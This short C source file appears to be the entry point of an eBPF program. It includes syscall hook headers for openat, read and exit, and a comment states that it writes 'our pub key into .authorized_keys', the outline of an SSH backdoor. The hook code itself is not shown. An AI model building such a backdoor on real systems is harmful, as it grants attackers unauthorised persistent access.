#include "./common.h"

//test
//#include "./sys_exceve_enter.bpf.h"

//get target file fd
#include "./syscall_openat.bpf.h"

#include "./syscall_exit.bpf.h"

// write our pub key into .authorized_keys
#include "./syscall_read.bpf.h"

char LICENSE[] SEC("license") = "GPL";
